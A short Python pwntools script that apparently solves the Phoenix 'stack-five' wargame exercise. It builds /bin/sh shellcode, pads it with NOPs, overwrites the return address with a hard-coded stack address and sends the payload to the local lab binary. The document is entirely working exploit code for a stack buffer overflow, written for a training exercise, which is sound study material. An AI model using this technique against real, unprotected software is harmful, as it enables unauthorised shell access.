# Buffer overflow shellcode execution

# This exercise aims at filling shellcode into the buffer, then calling
# /bin/sh

# There's 128 chars in space, so it's not a ton of room. we can
# execute a shell though

import binascii
import pwn

filepath = '/opt/phoenix/amd64/stack-five'

opened_file= pwn.ELF(filepath)
pwn.context.arch = 'amd64'
pwn.context.os = 'linux'

# Prepare shellcode to execv /bin/sh
# We don't have NX enabled, so I don't care to jump and find SYSTEM(), EXIT(), and a /bin/sh string
shell = pwn.shellcraft.amd64.linux.sh()
payload = pwn.asm(shell)

# Prepare padding
while len(payload) != 136:
    payload = pwn.asm(pwn.shellcraft.nop()) + payload 

# This exercise doesn't have NX/DEP enabled, so we can jump directly back into our shellcode.
return_addr = binascii.unhexlify('7fffffffdef0')[::-1]
payload = payload + return_addr

pwn.log.info('Prepared full payload: ' + binascii.hexlify(payload))

proc = opened_file.process()
pwn.log.info(proc.recvline().decode('utf-8'))

proc.sendline(payload)
exit()
